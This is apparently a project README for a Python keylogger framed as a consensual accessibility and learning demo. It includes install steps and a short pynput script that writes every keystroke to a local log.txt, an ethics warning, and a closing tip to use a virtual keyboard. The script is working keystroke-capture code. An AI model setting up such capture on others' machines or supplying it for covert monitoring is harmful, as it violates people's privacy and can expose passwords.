# KeyLogger
To capture the keyboard events 

# Keyboard-event-demo (Consent-first Accessibility / Learning Demo)

**Purpose**  
A small educational demo showing how to capture keyboard events with `pynput` for accessibility research and debugging. This project is intended for **legitimate, consensual** use only (your own machine or systems where you have explicit permission).

**Important — Ethics & Legal**  
Do NOT use this software to record other people's input without explicit, informed, written consent. Capturing keystrokes covertly may violate laws and privacy rights.

**How to use (safe demo)**  

1.install the python

2.Open command prompt

            pip install pynput 

3.save file in notepad by keylogger.py

            from pynput.keyboard import Listener
            def log_keystroke(key):
                key=str(key).replace('"',"")# Remove quotes
                if key =="Key.space":
                    key=" " #Convert "Key.space" to actual space
                elif key=="Key.enter":
                    key="\n" #Convert enter key to new line
                with open("log.txt","a")as file:
                    file.write(key)
            with Listener(on_press=log_keystroke)as listener:
                listener.join()

 4. in cmd 

            python .\keylogger.py


know what you type anything that save in log.txt file

 5. open the file in cmd
    
            notepad log.txt


*** Thats why use the virtual keyboard ***
